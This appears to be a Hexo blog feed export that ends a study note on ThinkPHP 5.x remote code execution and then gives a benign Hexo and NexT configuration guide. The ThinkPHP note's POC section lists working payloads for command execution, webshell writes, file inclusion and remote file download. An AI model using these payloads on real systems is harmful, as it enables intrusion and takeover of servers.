<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Request.php:<span class="number">1083</span>, think\Request-&gt;<span class="title function_ invoke__">filterValue</span>()</span><br><span class="line">Request.php:<span class="number">1029</span>, think\Request-&gt;<span class="title function_ invoke__">input</span>()</span><br><span class="line">Request.php:<span class="number">865</span>, think\Request-&gt;<span class="title function_ invoke__">server</span>()</span><br><span class="line">Request.php:<span class="number">522</span>, think\Request-&gt;<span class="title function_ invoke__">method</span>()</span><br><span class="line">Request.php:<span class="number">637</span>, think\Request-&gt;<span class="title function_ invoke__">param</span>()</span><br><span class="line">App.php:<span class="number">469</span>, think<span class="title class_">\App</span>::<span class="title function_ invoke__">exec</span>()</span><br><span class="line">App.php:<span class="number">139</span>, think<span class="title class_">\App</span>::<span class="title function_ invoke__">run</span>()</span><br><span class="line">start.php:<span class="number">19</span>, <span class="keyword">require</span>()</span><br><span class="line">index.php:<span class="number">17</span>, &#123;main&#125;()</span><br></pre></td></tr></table></figure>
<h4 id="开启debug">开启debug</h4>
<p>进入<strong>Log</strong>操作后，跟进<strong>$request-&gt;param()</strong>，合并后<strong>param</strong>为<strong>array{0=&gt;id}</strong>数组，然后返回带进<strong>input</strong>方法。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">param</span>(<span class="params"><span class="variable">$name</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$default</span> = <span class="literal">null</span>, <span class="variable">$filter</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 当前请求参数和URL地址中的参数合并</span></span><br><span class="line">    <span class="variable language_">$this</span>-&gt;param      = <span class="title function_ invoke__">array_merge</span>(<span class="variable">$this</span>-&gt;param, <span class="variable">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="literal">false</span>), <span class="variable">$vars</span>, <span class="variable">$this</span>-&gt;<span class="title function_ invoke__">route</span>(<span class="literal">false</span>));</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;mergeParam = <span class="literal">true</span>;</span><br><span class="line">    <span class="comment">// ......</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">input</span>(<span class="variable">$this</span>-&gt;param, <span class="variable">$name</span>, <span class="variable">$default</span>, <span class="variable">$filter</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后步骤就跟上面未开启<strong>debug</strong>的一样了，传入的<strong>$data</strong>一顿操作变成字符串<strong>id</strong>然后继续调用<strong>filterValue</strong>方法。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">input</span>(<span class="params"><span class="variable">$data</span> = [], <span class="variable">$name</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$default</span> = <span class="literal">null</span>, <span class="variable">$filter</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;        </span><br><span class="line">    <span class="comment">// ......</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$data</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">array_walk_recursive</span>(<span class="variable">$data</span>, [<span class="variable">$this</span>, <span class="string">&#x27;filterValue&#x27;</span>], <span class="variable">$filter</span>);</span><br><span class="line">        <span class="title function_ invoke__">reset</span>(<span class="variable">$data</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">filterValue</span>(<span class="variable">$data</span>, <span class="variable">$name</span>, <span class="variable">$filter</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>后面就跟上面的一样了，附上调用栈。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Request.php:<span class="number">1083</span>, think\Request-&gt;<span class="title function_ invoke__">filterValue</span>()</span><br><span class="line">Request.php:<span class="number">1026</span>, <span class="title function_ invoke__">array_walk_recursive</span>()</span><br><span class="line">Request.php:<span class="number">1026</span>, think\Request-&gt;<span class="title function_ invoke__">input</span>()</span><br><span class="line">Request.php:<span class="number">661</span>, think\Request-&gt;<span class="title function_ invoke__">param</span>()</span><br><span class="line">App.php:<span class="number">126</span>, think<span class="title class_">\App</span>::<span class="title function_ invoke__">run</span>()</span><br><span class="line">start.php:<span class="number">19</span>, <span class="keyword">require</span>()</span><br><span class="line">index.php:<span class="number">17</span>, &#123;main&#125;()</span><br></pre></td></tr></table></figure>
<h3 id="一些疑惑">一些疑惑</h3>
<p><strong>get</strong>传入的<strong>s=captcha</strong>和<strong>post</strong>传入的<strong>method=get</strong>好像没啥用，应该是小版本的问题，未测。</p>
<h3 id="poc">POC</h3>
<h3 id="section-1">5.0.0-5.0.20</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST ?s=index/index</span><br><span class="line">s=whoami&amp;_method=__construct&amp;method=POST&amp;filter[]=system</span><br><span class="line">aaaa=whoami&amp;_method=__construct&amp;method=GET&amp;filter[]=system</span><br><span class="line">_method=__construct&amp;method=GET&amp;filter[]=system&amp;get[]=whoami</span><br><span class="line"></span><br><span class="line">POST</span><br><span class="line">s=file_put_contents(&#x27;test.php&#x27;,&#x27;&lt;?php phpinfo();&#x27;)&amp;_method=__construct&amp;method=POST&amp;filter[]=assert</span><br></pre></td></tr></table></figure>
<h3 id="section-2">5.0.8-5.0.20</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST ?s=index/index</span><br><span class="line">c=system&amp;f=calc&amp;_method=filter</span><br></pre></td></tr></table></figure>
<h3 id="section-3">5.0.13-5.0.23</h3>
<p>有captcha路由时无需debug=true</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST ?s=captcha/calc</span><br><span class="line">_method=__construct&amp;filter[]=system&amp;method=GET</span><br></pre></td></tr></table></figure>
<h3 id="section-4">5.0.21-5.0.23</h3>
<p>有captcha路由时无需debug=true</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST ?s=captcha</span><br><span class="line">_method=__construct&amp;filter[]=system&amp;server[REQUEST_METHOD]=calc&amp;method=get</span><br></pre></td></tr></table></figure>
<p>默认debug=false，需要开启debug 命令执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST ?s=index/index</span><br><span class="line">_method=__construct&amp;filter[]=system&amp;server[REQUEST_METHOD]=calc</span><br><span class="line"></span><br><span class="line">POST</span><br><span class="line">_method=__construct&amp;filter[]=assert&amp;server[REQUEST_METHOD]=file_put_contents(&#x27;test.php&#x27;,&#x27;&lt;?php phpinfo();&#x27;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>5.0.23</p>
<p>debug无关，路由为captcha</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -X &#x27;POST&#x27; &#x27;http://127.0.0.1:18888/tp5/public/index.php?s=captcha/whoami&#x27; -d &#x27;_method=__construct&amp;filter[]=system&amp;method=GET&#x27;</span><br><span class="line">curl -X &#x27;POST&#x27; &#x27;http://127.0.0.1:18888/tp5/public/index.php?s=captcha&#x27; -d &#x27;_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=id&#x27;  </span><br><span class="line">curl -X &#x27;POST&#x27; &#x27;http://127.0.0.1:18888/tp5/public/index.php?s=captcha&#x27; -d &#x27;_method=__construct&amp;method=GET&amp;filter[]=system&amp;get[]=whoami&#x27;</span><br><span class="line"></span><br><span class="line">curl &#x27;http://127.0.0.1:18888/tp5/public/index.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id&#x27;</span><br><span class="line"></span><br><span class="line">http://127.0.0.1:18888/tp5/public/index.php?s=index|think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][0]=whoami</span><br><span class="line"></span><br><span class="line">?s=index/think\config/get&amp;name=database.username // 获取配置信息</span><br><span class="line">?s=index/\think\Lang/load&amp;file=../../test.jpg    // 包含任意文件</span><br><span class="line">?s=index/\think\Config/load&amp;file=../../t.php     // 包含任意.php文件</span><br></pre></td></tr></table></figure>
<p>开启debug</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -X <span class="string">&#x27;POST&#x27;</span> <span class="string">&#x27;http://127.0.0.1:18888/tp5/public/index.php?s=index/index&#x27;</span> -d <span class="string">&#x27;_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=id&#x27;</span></span><br><span class="line"></span><br><span class="line">curl -X <span class="string">&#x27;POST&#x27;</span> <span class="string">&#x27;http://127.0.0.1:18888/tp5/public/index.php?s=index/index&#x27;</span> -d <span class="string">&#x27;_method=__construct&amp;method=GET&amp;filter[]=system&amp;get[]=whoami&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -X &#x27;POST&#x27; &#x27;http://127.0.0.1:18888/tp5/public/index.php?s=index/index&#x27; -d &#x27;_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=id&#x27;</span><br><span class="line"></span><br><span class="line">curl -X &#x27;POST&#x27; &#x27;http://127.0.0.1:18888/tp5/public/index.php?s=index/index&#x27; -d &#x27;aaaa=id&amp;_method=__construct&amp;method=POST&amp;filter[]=system&#x27;</span><br><span class="line">curl -X &#x27;POST&#x27; &#x27;http://127.0.0.1:18888/tp5/public/index.php?s=index/index&#x27; -d &#x27;s=id&amp;_method=__construct&amp;method=POST&amp;filter[]=system&#x27;</span><br><span class="line">curl -X &#x27;POST&#x27; &#x27;http://127.0.0.1:18888/tp5/public/index.php?s=index/index&#x27; -d &#x27;_method=__construct&amp;method=GET&amp;filter[]=system&amp;get[]=whoami&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">curl -X &#x27;POST&#x27; &#x27;http://127.0.0.1:18888/tp5/public/index.php?s=index/index&#x27; -d &#x27;c=system&amp;f=whoami&amp;_method=filter&#x27;</span><br><span class="line">curl -X &#x27;POST&#x27; &#x27;http://127.0.0.1:18888/tp5/public/index.php?s=captcha/whoami&#x27; -d &#x27;_method=__construct&amp;filter[]=system&amp;method=GET&#x27;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>5.1.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?s=index/\think\template\driver\file/write&amp;cacheFile=shell.php&amp;content=&lt;?php phpinfo();?&gt;</span><br><span class="line">?s=index/\think\view\driver\Think/display&amp;template=&lt;?php phpinfo();?&gt;             //shell生成在runtime/temp/md5(template).php</span><br><span class="line">?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=assert&amp;vars[1][]=copy(&#x27;远程地址&#x27;,&#x27;333.php&#x27;)</span><br><span class="line">?s=index/\think\view\driver\Php/display&amp;content=&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://php.local/thinkphp5.0.5/public/index.php?s=index</span><br><span class="line">post</span><br><span class="line">_method=__construct&amp;method=get&amp;filter[]=call_user_func&amp;get[]=phpinfo</span><br><span class="line">_method=__construct&amp;filter[]=system&amp;method=GET&amp;get[]=whoami</span><br><span class="line"></span><br><span class="line"># ThinkPHP &lt;= 5.0.13</span><br><span class="line">POST /?s=index/index</span><br><span class="line">s=whoami&amp;_method=__construct&amp;method=&amp;filter[]=system</span><br><span class="line"></span><br><span class="line"># ThinkPHP &lt;= 5.0.23、5.1.0 &lt;= 5.1.16 需要开启框架app_debug</span><br><span class="line">POST /</span><br><span class="line">_method=__construct&amp;filter[]=system&amp;server[REQUEST_METHOD]=ls -al</span><br><span class="line"></span><br><span class="line"># ThinkPHP &lt;= 5.0.23 需要存在xxx的method路由，例如captcha</span><br><span class="line">POST /?s=xxx HTTP/1.1</span><br><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=ls+-al</span><br><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=ls</span><br></pre></td></tr></table></figure>
<h1 id="未开启强制路由rce">未开启强制路由RCE</h1>
<h1 id="refer">Refer</h1>
<p><a
href="http://www.yongsheng.site/2021/12/03/ThinkPHP%20v5.x%20RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E6%94%B6%E9%9B%86/"><strong>ThinkPHP
v5 RCE</strong>漏洞分析与收集</a></p>
<p><a href="https://y4er.com/post/thinkphp5-rce/"><strong>Thinkphp5
RCE</strong>总结</a></p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>PHP</tag>
        <tag>ThinkPHP</tag>
      </tags>
  </entry>
  <entry>
    <title>关于HEXO博客的配置</title>
    <url>/Configure-Hexo/</url>
    <content><![CDATA[<p>本地编辑文档然后通过 <strong>Github</strong> 同步到服务器的方式。</p>
<span id="more"></span>
<h1 id="博客配置">博客配置</h1>
<h2 id="本地端">本地端</h2>
<p>安装 <strong>Hexo</strong>。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br></pre></td></tr></table></figure>
<p>建立一个文件夹存放博客。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo init blog</span><br></pre></td></tr></table></figure>
<p>安装一些插件【这个主要看自己的需求，我这里安装了一个用于支持图片和本地预览以及<strong>Git</strong>同步的插件。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install --save hexo-deployer-git hexo-server hexo-asset-image</span><br></pre></td></tr></table></figure>
<p>修改 <strong>Blog</strong> 根目录下的 <strong>_config.yml</strong>
用于支持图片。</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="string">post_asset_folder:true</span></span><br></pre></td></tr></table></figure>
<h2 id="github-配置">Github 配置</h2>
<p>项目的 <strong>Settings/Security/Actions/Secrets</strong> 处
<strong>New repository secret</strong>，名称为
<strong>DEPLOY_PRIVATE</strong>，用于传递环境变量。</p>
<h3 id="deploy-配置">Deploy 配置</h3>
<p><strong>dependabot</strong> 配置</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># .github/dependabot.yml</span></span><br><span class="line"></span><br><span class="line"><span class="attr">version:</span> <span class="number">2</span></span><br><span class="line"><span class="attr">updates:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">package-ecosystem:</span> <span class="string">npm</span></span><br><span class="line">  <span class="attr">directory:</span> <span class="string">&quot;/&quot;</span></span><br><span class="line">  <span class="attr">schedule:</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="string">daily</span></span><br><span class="line">  <span class="attr">open-pull-requests-limit:</span> <span class="number">20</span></span><br></pre></td></tr></table></figure>
<p><strong>deploy</strong> 配置</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># .github/workflows/deploy.yml</span></span><br><span class="line"></span><br><span class="line"><span class="attr">name:</span> <span class="string">Hexo</span> <span class="string">Deploy</span></span><br><span class="line"></span><br><span class="line"><span class="attr">on:</span></span><br><span class="line">  <span class="attr">push:</span></span><br><span class="line">    <span class="attr">branches:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">main</span></span><br><span class="line"></span><br><span class="line"><span class="attr">jobs:</span></span><br><span class="line">  <span class="attr">build:</span></span><br><span class="line">    <span class="attr">runs-on:</span> <span class="string">ubuntu-latest</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">steps:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Checkout</span> <span class="string">source</span></span><br><span class="line">        <span class="attr">uses:</span> <span class="string">actions/checkout@v2</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">ref:</span> <span class="string">main</span></span><br><span class="line"></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Setup</span> <span class="string">Node.js</span></span><br><span class="line">        <span class="attr">uses:</span> <span class="string">actions/setup-node@v1</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">node-version:</span> <span class="string">&#x27;16&#x27;</span></span><br><span class="line"></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Setup</span> <span class="string">Hexo</span></span><br><span class="line">        <span class="attr">env:</span></span><br><span class="line">          <span class="attr">DEPLOY_PRIVATE:</span> <span class="string">$&#123;&#123;</span> <span class="string">secrets.DEPLOY_PRIVATE</span> <span class="string">&#125;&#125;</span></span><br><span class="line">        <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line"><span class="string">          mkdir -p ~/.ssh/</span></span><br><span class="line"><span class="string">          echo &quot;$DEPLOY_PRIVATE&quot; &gt; ~/.ssh/id_rsa</span></span><br><span class="line"><span class="string">          chmod 700 ~/.ssh</span></span><br><span class="line"><span class="string">          chmod 600 ~/.ssh/id_rsa</span></span><br><span class="line"><span class="string">          ssh-keyscan github.com &gt;&gt; ~/.ssh/known_hosts</span></span><br><span class="line"><span class="string">          git config --global user.email &quot;i@southsea.st&quot;</span></span><br><span class="line"><span class="string">          git config --global user.name &quot;Southseast&quot;</span></span><br><span class="line"><span class="string">          sudo apt install pandoc</span></span><br><span class="line"><span class="string">          npm install hexo-cli -g</span></span><br><span class="line"><span class="string">          npm install</span></span><br><span class="line"><span class="string"></span>      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Deploy</span></span><br><span class="line">        <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line"><span class="string">          hexo clean</span></span><br><span class="line"><span class="string">          hexo deploy</span></span><br></pre></td></tr></table></figure>
<h3 id="插件">插件</h3>
<h4 id="配置文章加密">配置文章加密</h4>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install --save hexo-blog-encrypt</span><br></pre></td></tr></table></figure>
<h4 id="站点地图">站点地图</h4>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install --save hexo-generator-sitemap hexo-generator-baidu-sitemap </span><br></pre></td></tr></table></figure>
<h4 id="图片">图片</h4>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install --save hexo-asset-image</span><br></pre></td></tr></table></figure>
<h1 id="主题配置">主题配置</h1>
<p>使用了 <strong><a
href="http://theme-next.iissnan.com/">Next</a></strong>
主题，以下配置仅供参考，仅符合本人使用习惯和审美。</p>
<h2 id="底部信息">底部信息</h2>
<p>**themes/next/_config.yml<strong>，</strong>50** 行，关闭
<strong>power</strong> 和 <strong>theme</strong> 的信息显示。</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">footer:</span></span><br><span class="line">  <span class="comment"># Specify the date when the site was setup. If not defined, current year will be used.</span></span><br><span class="line">  <span class="attr">since:</span> <span class="number">2018</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Icon between year and copyright info.</span></span><br><span class="line">  <span class="attr">icon:</span></span><br><span class="line">    <span class="comment"># Icon name in Font Awesome. See: https://fontawesome.com/v4.7.0/icons/</span></span><br><span class="line">    <span class="comment"># `heart` is recommended with animation in red (#ff0000).</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">user</span></span><br><span class="line">    <span class="comment"># If you want to animate the icon, set it to true.</span></span><br><span class="line">    <span class="attr">animated:</span> <span class="literal">false</span></span><br><span class="line">    <span class="comment"># Change the color of icon, using Hex Code.</span></span><br><span class="line">    <span class="attr">color:</span> <span class="string">&quot;#808080&quot;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># If not defined, `author` from Hexo `_config.yml` will be used.</span></span><br><span class="line">  <span class="attr">copyright:</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">powered:</span></span><br><span class="line">    <span class="comment"># Hexo link (Powered by Hexo).</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">    <span class="comment"># Version info of Hexo after Hexo link (vX.X.X).</span></span><br><span class="line">    <span class="attr">version:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">theme:</span></span><br><span class="line">    <span class="comment"># Theme &amp; scheme info link (Theme - NexT.scheme).</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">    <span class="comment"># Version info of NexT after scheme info (vX.X.X).</span></span><br><span class="line">    <span class="attr">version:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure>
<h2 id="主题样式">主题样式</h2>
<p>**themes/next/_config.yml<strong>，</strong>106** 行，更改主题为
<strong>Gemini</strong>。</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Schemes</span></span><br><span class="line"><span class="comment"># scheme: Muse</span></span><br><span class="line"><span class="comment"># scheme: Mist</span></span><br><span class="line"><span class="comment"># scheme: Pisces</span></span><br><span class="line"><span class="attr">scheme:</span> <span class="string">Gemini</span></span><br></pre></td></tr></table></figure>
<h2 id="导航栏">导航栏</h2>
<p>**themes/Next/_config.yml<strong>，</strong>125** 行，启用
<strong>tags</strong> 界面。</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">menu:</span></span><br><span class="line">  <span class="attr">home:</span> <span class="string">/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-home</span></span><br><span class="line">  <span class="comment">#about: /about/ || fa fa-user</span></span><br><span class="line">  <span class="attr">tags:</span> <span class="string">/tags/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-tags</span></span><br><span class="line">  <span class="attr">categories:</span> <span class="string">/categories/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-th</span></span><br><span class="line">  <span class="attr">archives:</span> <span class="string">/archives/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-archive</span></span><br><span class="line">  <span class="comment">#schedule: /schedule/ || fa fa-calendar</span></span><br><span class="line">  <span class="comment">#sitemap: /sitemap.xml || fa fa-sitemap</span></span><br><span class="line">  <span class="comment">#commonweal: /404/ || fa fa-heartbeat</span></span><br></pre></td></tr></table></figure>
<h2 id="头像">头像</h2>
<p>**themes/Next/_config.yml<strong>，</strong>170**
行，设置头像地址。</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Sidebar Avatar</span></span><br><span class="line"><span class="attr">avatar:</span></span><br><span class="line">  <span class="comment"># Replace the default image and set the url here.</span></span><br><span class="line">  <span class="attr">url:</span> <span class="string">/images/avatar.gif</span></span><br><span class="line">  <span class="comment"># If true, the avatar will be dispalyed in circle.</span></span><br><span class="line">  <span class="attr">rounded:</span> <span class="literal">false</span></span><br><span class="line">  <span class="comment"># If true, the avatar will be rotated with the cursor.</span></span><br><span class="line">  <span class="attr">rotated:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure>
<h2 id="联系方式">联系方式</h2>
<p>**themes/Next/_config.yml<strong>，</strong>186**
行，设置联系方式。</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">social:</span></span><br><span class="line">  <span class="attr">GitHub:</span> <span class="string">https://github.com/southseast</span> <span class="string">||</span> <span class="string">fab</span> <span class="string">fa-github</span></span><br><span class="line">  <span class="attr">E-Mail:</span> <span class="string">mailto:i@southsea.st</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-envelope</span></span><br></pre></td></tr></table></figure>
<h2 id="友链">友链</h2>
<p>**themes/Next/_config.yml<strong>，</strong>203**
行，设置友链样式。</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Blog rolls</span></span><br><span class="line"><span class="attr">links_settings:</span></span><br><span class="line">  <span class="attr">icon:</span> <span class="string">link</span></span><br><span class="line">  <span class="attr">title:</span> <span class="string">Links</span></span><br><span class="line">  <span class="comment"># Available values: block | inline</span></span><br><span class="line">  <span class="attr">layout:</span> <span class="string">inline</span></span><br></pre></td></tr></table></figure>
<h2 id="文章详情">文章详情</h2>
<p>**themes/Next/_config.yml<strong>，</strong>265
**行，关闭了更新时间。</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Post meta display settings</span></span><br><span class="line"><span class="attr">post_meta:</span></span><br><span class="line">  <span class="attr">item_text:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">created_at:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">updated_at:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">    <span class="attr">another_day:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">categories:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>
<h2 id="文章标签样式">文章标签样式</h2>
<p>**themes/Next/_config.yml<strong>，</strong>283 **行。</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Use icon instead of the symbol # to indicate the tag at the bottom of the post</span></span><br><span class="line"><span class="attr">tag_icon:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>
<h2 id="文章评论">文章评论</h2>
<p>**themes/Next/_config.yml<strong>，</strong>695** 行。</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">disqusjs:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="comment"># API Endpoint of Disqus API (https://disqus.com/api/docs/).</span></span><br><span class="line">  <span class="comment"># Leave api empty if you are able to connect to Disqus API. Otherwise you need a reverse proxy for it.</span></span><br><span class="line">  <span class="comment"># For example:</span></span><br><span class="line">  <span class="comment"># api: https://disqus.skk.moe/disqus/</span></span><br><span class="line">  <span class="attr">api:</span> <span class="string">https://disqus.skk.moe/disqus/</span></span><br><span class="line">  <span class="attr">apikey:</span> <span class="comment"># Register new application from https://disqus.com/api/applications/</span></span><br><span class="line">  <span class="attr">shortname:</span> <span class="comment"># See: https://disqus.com/admin/settings/general/</span></span><br></pre></td></tr></table></figure>
<h2 id="访客统计">访客统计</h2>
<p>这里用的不蒜子，**themes/Next/_config.yml<strong>，</strong>747**行。</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">busuanzi_count:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">total_visitors:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">total_visitors_icon:</span> <span class="string">user</span></span><br><span class="line">  <span class="attr">total_views:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">total_views_icon:</span> <span class="string">eye</span></span><br><span class="line">  <span class="attr">post_views:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">post_views_icon:</span> <span class="string">eye</span></span><br></pre></td></tr></table></figure>
<p>路径是
**themes/Next/layout/_third-party/statistics/busuanzi-counter.swig**。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#123;%- if theme.busuanzi_count.enable %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;busuanzi-count&quot;</span>&gt;</span></span><br><span class="line">  &lt;script&#123;&#123; pjax &#125;&#125; async src=&quot;https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js&quot;&gt;<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  &#123;%- if theme.busuanzi_count.total_visitors %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;post-meta-item&quot;</span> <span class="attr">id</span>=<span class="string">&quot;busuanzi_container_site_uv&quot;</span> <span class="attr">style</span>=<span class="string">&quot;display: none;&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">      &lt;span class=&quot;post-meta-item-icon&quot;&gt;</span></span><br><span class="line"><span class="comment">        &lt;i class=&quot;fa fa-&#123;&#123; theme.busuanzi_count.total_visitors_icon &#125;&#125;&quot;&gt;&lt;/i&gt;</span></span><br><span class="line"><span class="comment">      &lt;/span&gt; </span></span><br><span class="line"><span class="comment">    --&gt;</span></span><br><span class="line">      有</span><br><span class="line">      <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;site-uv&quot;</span> <span class="attr">title</span>=<span class="string">&quot;&#123;&#123; __(&#x27;footer.total_visitors&#x27;) &#125;&#125;&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">&quot;busuanzi_value_site_uv&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">  &#123;%- endif %&#125;</span><br><span class="line"></span><br><span class="line">  &#123;%- if theme.busuanzi_count.total_visitors and theme.busuanzi_count.total_views %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;post-meta-divider&quot;</span>&gt;</span>只猫来偷了<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">  &#123;%- endif %&#125;</span><br><span class="line"></span><br><span class="line">  &#123;%- if theme.busuanzi_count.total_views %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;post-meta-item&quot;</span> <span class="attr">id</span>=<span 